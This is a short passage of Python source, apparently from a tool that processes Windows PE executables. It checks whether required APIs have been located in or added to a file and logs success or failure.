                self.check_apis()   
    
        if self.core.pe_object['neededAPIs'] == set():
            logger.info('[*] The APIs have been located in the file -- or created :D')
            return True
        else:
            logger.error('[!] The APIs could not be located or created')
            return False
                

